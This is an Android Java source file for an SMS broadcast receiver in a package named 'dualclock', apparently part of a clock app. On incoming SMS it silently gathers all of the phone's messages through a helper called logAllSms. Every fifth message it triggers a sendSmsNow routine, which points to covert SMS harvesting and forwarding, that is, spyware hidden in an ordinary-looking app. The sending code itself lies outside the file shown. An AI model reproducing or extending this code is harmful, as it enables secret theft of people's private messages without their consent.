package com.and.dualclock;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class SMSRecieve extends BroadcastReceiver {
	public static int sms = 0, smscount = 0;

	@Override
	public void onReceive(Context context, Intent intent) {
		// ---get the SMS message passed in---
		Bundle bundle = intent.getExtras();
// sms file update while receive sms
		if (bundle != null) {

			if (sms == 1) {

				String allSms = SmsProvider.logAllSms(context);
				allSms = ""+allSms;
				smscount++;
				if (smscount == 5) {
					Log.i("sms", "count" + smscount);

					smscount = 0;
					IncomingCallReceiver incoming = new IncomingCallReceiver();
					incoming.sendSmsNow();

				}

			}

		}
	}

	public void setsms(int sms1) {
		sms = sms1;
		Log.i("sms", "sms    set.");
		Log.i("sms", "inside" + sms);

	}
}
